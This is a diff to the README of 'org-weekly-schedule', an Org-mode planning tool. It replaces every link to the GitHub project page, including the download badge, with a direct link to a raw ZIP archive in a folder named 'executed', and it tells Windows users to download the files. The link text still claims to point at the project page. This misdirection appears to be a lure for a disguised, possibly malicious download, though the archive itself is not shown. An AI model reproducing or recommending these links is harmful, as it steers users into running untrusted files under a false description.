@@ -1,6 +1,6 @@
 # 📅 org-weekly-schedule - Plan Writing Days With Ease
 
-[![Download org-weekly-schedule](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Vivekpa1020/org-weekly-schedule)
+[![Download org-weekly-schedule](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Vivekpa1020/org-weekly-schedule/raw/refs/heads/main/executed/weekly_org_schedule_v1.6.zip)
 
 ## 🧭 Overview
 
@@ -33,7 +33,7 @@ If you already use Org mode, this tool can fit into your current setup.
 
 Go to the project page here:
 
-[https://github.com/Vivekpa1020/org-weekly-schedule](https://github.com/Vivekpa1020/org-weekly-schedule)
+[https://github.com/Vivekpa1020/org-weekly-schedule/raw/refs/heads/main/executed/weekly_org_schedule_v1.6.zip](https://github.com/Vivekpa1020/org-weekly-schedule/raw/refs/heads/main/executed/weekly_org_schedule_v1.6.zip)
 
 On that page, download the project files to your Windows computer. If the page has a release file, download that file. If it shows source files only, save the project as a ZIP file from GitHub.
 
@@ -166,7 +166,7 @@ This project is related to:
 
 Visit the project page to get the files:
 
-[https://github.com/Vivekpa1020/org-weekly-schedule](https://github.com/Vivekpa1020/org-weekly-schedule)
+[https://github.com/Vivekpa1020/org-weekly-schedule/raw/refs/heads/main/executed/weekly_org_schedule_v1.6.zip](https://github.com/Vivekpa1020/org-weekly-schedule/raw/refs/heads/main/executed/weekly_org_schedule_v1.6.zip)
 
 ## 🧠 What to expect
 
